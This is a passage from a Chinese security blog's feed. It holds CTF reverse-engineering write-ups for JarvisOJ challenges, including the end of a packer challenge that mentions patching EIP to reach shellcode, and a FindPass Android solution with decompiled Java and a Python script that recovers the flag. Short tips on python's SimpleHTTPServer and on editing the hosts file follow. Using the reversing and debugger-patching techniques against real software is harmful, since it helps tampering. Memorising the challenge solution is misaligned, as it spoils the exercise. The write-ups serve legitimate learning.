src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032df662d3879025.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><blockquote><p>以下是失败的尝试，建议直接跳过</p></blockquote><p>本来跳转没有实现，但是为了执行call edx ，我再一次无耻地改了eip</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032f1305cbf72967.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><p>本以为可以成功跳转到对应的shellcode，然而我失败了，最终手输的flag</p><blockquote><p>贴一个其他师傅的成功截图，我反正是没成功调到那一步的，，，太菜了</p><p><a href="https://blog.csdn.net/getsum/article/details/87902382" target="_blank" rel="noopener">https://blog.csdn.net/getsum/article/details/87902382</a></p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d033646d31a116716.png" alt="903673-20170526160217544-91070169.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="JarvisOJ" scheme="https://mrh1s.top/categories/write-up/JarvisOJ/"/>
    
    
      <category term="RE_Dynamic" scheme="https://mrh1s.top/tags/RE-Dynamic/"/>
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="packer" scheme="https://mrh1s.top/tags/packer/"/>
    
  </entry>
  
  <entry>
    <title>JarvisOJ-findpass</title>
    <link href="https://mrh1s.top/posts/512d4c5b/"/>
    <id>https://mrh1s.top/posts/512d4c5b/</id>
    <published>2019-06-13T16:00:52.000Z</published>
    <updated>2019-06-14T05:54:33.007Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="FindPass"><a href="#FindPass" class="headerlink" title="FindPass"></a>FindPass</h1><p><a href="\uploads\FindPass_200.7z">FindPass_200.7z</a> </p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>用jeb3.0解包apk文件，打开mainactivity，发现一个Getkey函数，思路非常明显</p><p>程序读取了src.jpg、fkey、input的内容，并且进行一定的加密操作，获得flag</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetKey</span><span class="params">(View arg16)</span> </span>&#123;</span><br><span class="line">        String input = <span class="keyword">this</span>.findViewById(<span class="number">0x7F080001</span>).getText().toString();</span><br><span class="line">        <span class="keyword">if</span>(TextUtils.isEmpty(input.trim())) &#123;</span><br><span class="line">            goto label_57;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] fkey = <span class="keyword">this</span>.getResources().getString(<span class="number">0x7F050003</span>).toCharArray();</span><br><span class="line">        <span class="keyword">int</span> v2 = fkey.length;</span><br><span class="line">        <span class="keyword">char</span>[] from_jpg = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">0x400</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> InputStreamReader(<span class="keyword">this</span>.getResources().getAssets().open(<span class="string">"src.jpg"</span>)).read(from_jpg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v3) &#123;</span><br><span class="line">            v3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v6;</span><br><span class="line">        <span class="keyword">for</span>(v6 = <span class="number">0</span>; v6 &lt; v2; ++v6) &#123;</span><br><span class="line">            <span class="keyword">int</span> v12 = from_jpg[fkey[v6]] % <span class="number">10</span>;</span><br><span class="line">            fkey[v6] = v6 % <span class="number">2</span> == <span class="number">1</span> ? ((<span class="keyword">char</span>)(fkey[v6] + v12)) : ((<span class="keyword">char</span>)(fkey[v6] - v12));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.equals(<span class="keyword">new</span> String(fkey))) &#123;</span><br><span class="line">            Toast.makeText(((Context)<span class="keyword">this</span>), <span class="string">"恭喜您，输入正确！Flag==flag&#123;Key&#125;"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(((Context)<span class="keyword">this</span>), <span class="string">"not right! lol。。。。"</span>, <span class="number">1</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        label_57:</span><br><span class="line">            Toast.makeText(((Context)<span class="keyword">this</span>), <span class="string">"请输入key值！"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>唯一有一点问题就是那个</p><blockquote><p>char[] fkey = this.getResources().getString(0x7F050003).toCharArray()</p></blockquote><p>经多方询问，最后明白这是一个读取内置字符串的函数，我们可以在</p><blockquote><p>Resources/values/strings.xml</p></blockquote><p>内找到，大多数的安卓软件都会把字符串放在这里面</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fkey = <span class="string">"Tr43Fla92Ch4n93"</span></span><br><span class="line">fromjpg = [<span class="number">0xFF</span>,<span class="number">0xD8</span>,<span class="number">0xFF</span>,<span class="number">0xE0</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x4A</span>,<span class="number">0x46</span>,<span class="number">0x49</span>,<span class="number">0x46</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xE1</span>,<span class="number">0x00</span>,<span class="number">0x30</span>,<span class="number">0x45</span>,<span class="number">0x78</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4D</span>,<span class="number">0x4D</span>,<span class="number">0x00</span>,<span class="number">0x2A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x31</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xDB</span>,<span class="number">0x00</span>,<span class="number">0x43</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x05</span>,<span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x0A</span>,<span class="number">0x07</span>,<span class="number">0x07</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x0A</span>,<span class="number">0x0C</span>,<span class="number">0x0C</span>,<span class="number">0x0B</span>,<span class="number">0x0A</span>,<span class="number">0x0B</span>,<span class="number">0x0B</span>,<span class="number">0x0D</span>,<span class="number">0x0E</span>,<span class="number">0x12</span>,<span class="number">0x10</span>,<span class="number">0x0D</span>,<span class="number">0x0E</span>,<span class="number">0x11</span>,<span class="number">0x0E</span>,<span class="number">0x0B</span>,<span class="number">0x0B</span>,<span class="number">0x10</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x11</span>]</span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(fkey)):</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">        t = ord(fkey[i]) + (fromjpg[ord(fkey[i])] % <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = ord(fkey[i]) - (fromjpg[ord(fkey[i])] % <span class="number">10</span>)</span><br><span class="line">    ans = ans + chr(t)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">"flag&#123;"</span> + ans + <span class="string">"&#125;"</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="JarvisOJ" scheme="https://mrh1s.top/categories/write-up/JarvisOJ/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="RE_Android" scheme="https://mrh1s.top/tags/RE-Android/"/>
    
  </entry>
  
  <entry>
    <title>利用python搭建简易http服务器</title>
    <link href="https://mrh1s.top/posts/cbf6a417/"/>
    <id>https://mrh1s.top/posts/cbf6a417/</id>
    <published>2019-06-13T12:54:11.000Z</published>
    <updated>2019-06-13T12:57:20.367Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="原料"><a href="#原料" class="headerlink" title="原料"></a>原料</h2><blockquote><p>linux系统（虚拟机），python</p></blockquote><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>首先cd到你想开服务器的目录下，再</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python -m SimpleHTTPServer [port]</span><br></pre></td></tr></table></figure><p>e.g. sudo python -m SimpleHTTPServer 80</p><p>这样就在80端口开启了服务器</p><blockquote><p>ubuntu:~/Desktop$ sudo python -m SimpleHTTPServer 80<br>Serving HTTP on 0.0.0.0 port 80 …<br>192.168.133.1 - - [13/Jun/2019 05:05:26] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:05:26] code 404, message File not found<br>192.168.133.1 - - [13/Jun/2019 05:05:26] “GET /favicon.ico HTTP/1.1” 404 -<br>192.168.133.1 - - [13/Jun/2019 05:06:32] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:07:00] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:15:58] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:18:36] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:20:23] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:37:08] “GET /x.jpg HTTP/1.1” 200 -<br>192.168.133.1 - - [13/Jun/2019 05:38:55] “GET /x.jpg HTTP/1.1” 200 -</p></blockquote><p>正常读取到http服务器下面的x.jpg</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>如何修改hosts</title>
    <link href="https://mrh1s.top/posts/b15e7935/"/>
    <id>https://mrh1s.top/posts/b15e7935/</id>
    <published>2019-06-13T12:47:01.000Z</published>
    <updated>2019-06-13T12:57:20.366Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><blockquote><p>hosts是将一个域名解析到ip地址的一个关联“数据库”</p><p>通过手动修改hosts，我们可以将域名解析到自己想要的ip上去</p></blockquote><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><blockquote><p>对于win10系统</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure><p>该文件目录下找到hosts文件，<strong>以管理员身份打开</strong>。</p><p>（否则无法修改）</p><h2 id="修改格式"><a href="#修改格式" class="headerlink" title="修改格式"></a>修改格式</h2><p>在hosts文件末尾添加信息，每行一条</p><blockquote><p>[ip] [host]</p></blockquote><p>e.g.  127.0.0.1 <a href="http://www.myhost.com" target="_blank" rel="noopener">www.myhost.com</a></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAI